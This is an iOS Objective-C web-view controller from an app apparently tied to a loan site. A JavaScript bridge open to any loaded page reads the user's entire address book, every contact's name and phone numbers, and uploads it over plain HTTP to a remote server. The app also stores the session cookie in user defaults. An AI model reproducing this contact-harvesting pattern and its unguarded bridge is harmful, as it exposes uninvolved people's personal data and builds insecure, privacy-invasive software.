//
//  IndexWebController.m
//  WhipMe
//
//  Created by Song on 2017/9/6.
//  Copyright © 2017年 -. All rights reserved.
//

#import "IndexWebController.h"
#import "JXAddressBook.h"

@implementation JSObjectModel

- (void)upLoadAddressBook:(NSString *)card {
    [self getAddressBookWithCard:card];
}

- (void)getAddressBookWithCard:(NSString *)card {
    ABAuthorizationStatus authStatus = ABAddressBookGetAuthorizationStatus();
    if (authStatus == kABAuthorizationStatusDenied) {
        // 没权限
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"通讯录权限未开启"
                                                            message:@"请到设置>隐私>定位服务中开启［环球黑卡］通讯录权限。"
                                                           delegate:self
                                                  cancelButtonTitle:@"取消"
                                                  otherButtonTitles:@"立即开启", nil];
        [alertView show];
        [alertView bk_setHandler:^{
            NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
            if ([[UIApplication sharedApplication] canOpenURL:url]) {
                [[UIApplication sharedApplication] openURL:url];
            }
        } forButtonAtIndex:1];
    } else {
        [JXAddressBook getPersonInfo:^(NSArray *personInfos) {
            NSMutableArray *addressBook = [NSMutableArray array];
            for (JXPersonInfo *personInfo in personInfos) {
                if ([NSString isBlankString:personInfo.showAllPhoneNO] == NO &&
                    [NSString isBlankString:personInfo.fullName] == NO &&
                    [personInfo.selectedPhoneNO isEqualToString:@"空"] == NO) {
                    NSDictionary *addressBookDict = @{@"number":personInfo.showAllPhoneNO,
                                                      @"name":personInfo.fullName};
                    [addressBook addObject:addressBookDict];
                }
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self upLoadNetWork:addressBook withCard:card];
            });
        }];
    }
}

- (void)upLoadNetWork:(NSArray *)datas withCard:(NSString *)card{
    if (datas.count == 0 || card.length == 0) {
        return;
    }
    NSDictionary *params = @{@"card":card,@"datas":datas};
    
    [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:YES];
    AFHTTPSessionManager *manager = [[AFHTTPSessionManager alloc] initWithBaseURL:[NSURL URLWithString:@"http://hb.qcsdai.com/submits"]];
    manager.requestSerializer   = [AFJSONRequestSerializer serializer];
    manager.responseSerializer  = [AFJSONResponseSerializer serializer];
    manager.requestSerializer.timeoutInterval = 15;
    manager.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"text/html",@"text/plain",@"application/json",nil];
    
    [manager POST:@"/submits" parameters:params progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable result) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
//        id data = [result mj_JSONObject];
        DebugLog(@"success\nresult:%@\nparams:%@",result,params);
        [Tool showHUDTipWithTipStr:@"上传成功"];
        [self.webController.webViewWM loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://hb.qcsdai.com/mobile/app.htm"]]];
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        [[UIApplication sharedApplication] setNetworkActivityIndicatorVisible:NO];
        DebugLog(@"error:%@",error);
        [Tool showHUDTipWithTipStr:@"上传失败"];
        [self.webController.webViewWM loadRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:@"http://hb.qcsdai.com/mobile/app.htm"]]];
    }];
}

@end

@interface IndexWebController ()<UIWebViewDelegate>

@end

@implementation IndexWebController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    [self setup];
}


- (void)dealloc {
//    [[NSURLCache sharedURLCache] removeAllCachedResponses];
    DebugLog(@"%@",NSStringFromClass(self.class));
}

- (void)setup {
    WEAK_SELF
    
    [self.view setBackgroundColor:[UIColor whiteColor]];
    self.webViewWM = [[UIWebView alloc] initWithFrame:CGRectZero];
    self.webViewWM.scalesPageToFit = YES;
    self.webViewWM.delegate = self;
    [self.webViewWM.scrollView setBounces:NO];
    [self.view addSubview:self.webViewWM];
    [self.webViewWM mas_updateConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(weakSelf.view);
    }];
    [self startLoad];
    
    
//    NSDictionary *data = [NSDictionary dictionaryWithContentsOfFile:[[NSBundle mainBundle] pathForResource:@"ZongDa" ofType:@"plist"]];
//    DebugLog(@"____data1:%@",data);
    
}

- (void)startLoad {
    if (self.webViewWM.isLoading) {
        return;
    }
    NSArray *cookies =[[NSUserDefaults standardUserDefaults]  objectForKey:@"cookies"];
    NSMutableDictionary *cookieProperties = [NSMutableDictionary dictionary];
    if ([cookies objectAtIndex:0]) {
        [cookieProperties setObject:[cookies objectAtIndex:0] forKey:NSHTTPCookieName];
    }
    if ([cookies objectAtIndex:1]) {
        [cookieProperties setObject:[cookies objectAtIndex:1] forKey:NSHTTPCookieValue];
    }
    if ([cookies objectAtIndex:3]) {
        [cookieProperties setObject:[cookies objectAtIndex:3] forKey:NSHTTPCookieDomain];
    }
    if ([cookies objectAtIndex:4]) {
        [cookieProperties setObject:[cookies objectAtIndex:4] forKey:NSHTTPCookiePath];

    }
    NSHTTPCookie *cookieuser = [NSHTTPCookie cookieWithProperties:cookieProperties];
    [[NSHTTPCookieStorage sharedHTTPCookieStorage]  setCookie:cookieuser];

    NSURL *url = [NSURL URLWithString:@"http://hb.qcsdai.com/mobile/app.htm"];
    NSURLRequest *request = [[NSURLRequest alloc] initWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:60];
    [self.webViewWM loadRequest:request];
}

- (void)loadErrorHtml {
    NSString *path = [[NSBundle mainBundle] bundlePath];
    NSURL *baseURL = [NSURL fileURLWithPath:path];
    NSString *htmlPath = [[NSBundle mainBundle] pathForResource:@"error" ofType:@"html"];
    NSString *htmlCont = [NSString stringWithContentsOfFile:htmlPath encoding:NSUTF8StringEncoding error:nil];
    
    [self.webViewWM loadHTMLString:htmlCont baseURL:baseURL];
}

#pragma mark - UIWebViewDelegate
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType {
    return YES;
}

- (void)webViewDidStartLoad:(UIWebView *)webView {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = YES;
    JSContext *jsContext = (JSContext *)[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"];
    JSObjectModel *model  = [[JSObjectModel alloc] init];
    model.webController = self;
    [jsContext setObject:model forKeyedSubscript:@"js"];
    [self.webViewWM stringByEvaluatingJavaScriptFromString:@"js"];
    jsContext.exceptionHandler = ^(JSContext *context, JSValue *exceptionValue) {
        context.exception = exceptionValue;
        DebugLog(@"异常信息：%@", exceptionValue);
    };

}

- (void)webViewDidFinishLoad:(UIWebView *)webView {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
    JSContext *jsContext = (JSContext *)[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"];
    JSObjectModel *model  = [[JSObjectModel alloc] init];
    model.webController = self;
    [jsContext setObject:model forKeyedSubscript:@"js"];
    [self.webViewWM stringByEvaluatingJavaScriptFromString:@"js"];
    jsContext.exceptionHandler = ^(JSContext *context, JSValue *exceptionValue) {
        context.exception = exceptionValue;
        DebugLog(@"异常信息：%@", exceptionValue);
    };
    NSString *webTitle = [webView stringByEvaluatingJavaScriptFromString:@"document.title"];
    if ([NSString isBlankString:webTitle] == NO) {
        self.navigationItem.title = webTitle;
    }
    
    NSArray *nCookies = [[NSHTTPCookieStorage sharedHTTPCookieStorage] cookies];
    NSHTTPCookie *cookie;
    for (id c in nCookies)
    {
        if ([c isKindOfClass:[NSHTTPCookie class]])
        {
            cookie=(NSHTTPCookie *)c;
            if ([cookie.name isEqualToString:@"JSESSIONID"]) {
                NSNumber *sessionOnly = [NSNumber numberWithBool:cookie.sessionOnly];
                NSNumber *isSecure = [NSNumber numberWithBool:cookie.isSecure];
                NSArray *cookies = [NSArray arrayWithObjects:cookie.name, cookie.value, sessionOnly, cookie.domain, cookie.path, isSecure, nil];
                [[NSUserDefaults standardUserDefaults] setObject:cookies forKey:@"cookies"];
                break;
            }
        }
    }
}

- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error {
    [UIApplication sharedApplication].networkActivityIndicatorVisible = NO;
    if([error code] == NSURLErrorCancelled) {
        return;
    }
}

@end
